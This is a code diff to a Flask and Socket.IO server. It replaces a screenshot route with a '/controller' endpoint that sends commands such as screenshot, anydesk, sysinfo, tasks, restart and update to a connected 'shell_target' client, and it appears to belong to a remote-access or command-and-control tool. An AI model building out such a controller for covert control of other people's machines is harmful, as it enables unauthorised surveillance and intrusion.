@@ -122,7 +122,7 @@ def handle_message(message):
     print('Received message: ' + message)
 
 
-@app.route('/screenshot', methods=['POST'])
+@app.route('/controller', methods=['POST'])
 def send_message():
     data = request.json.get('data')
     if data == 'screenshot':
@@ -130,9 +130,40 @@ def send_message():
         sio.emit('message', 'screenshot', room=room_id)
         return jsonify({'message': 'Screenshot message sent.'})
 
+    elif data == 'anydesk':
+        room_id = list(shell_target.keys())[0]
+        sio.emit('message', 'anydesk', room=room_id)
+        return jsonify({'message': 'Anydesk message sent.'})
+
+    elif data == 'sysinfo':
+        room_id = list(shell_target.keys())[0]
+        sio.emit('message', 'sysinfo', room=room_id)
+        return jsonify({'message': 'Sysinfo message sent.'})
+
+    elif data == 'tasks':
+        room_id = list(shell_target.keys())[0]
+        sio.emit('message', 'tasks', room=room_id)
+        return jsonify({'message': 'Tasks message sent.'})
+
+    elif data == 'restart':
+        room_id = list(shell_target.keys())[0]
+        sio.emit('message', 'restart', room=room_id)
+        return jsonify({'message': 'Restart message sent.'})
+
+    elif data == 'local':
+        room_id = list(shell_target.keys())[0]
+        sio.emit('message', 'local', room=room_id)
+        return jsonify({'message': 'Local message sent.'})
+
+    elif data == 'update':
+        room_id = list(shell_target.keys())[0]
+        sio.emit('message', 'update', room=room_id)
+        return jsonify({'message': 'Update message sent.'})
+
 
 @sio.on('disconnect')
 def handle_disconnect():
+    shell_target.clear()
     print('Client disconnected')
 
 
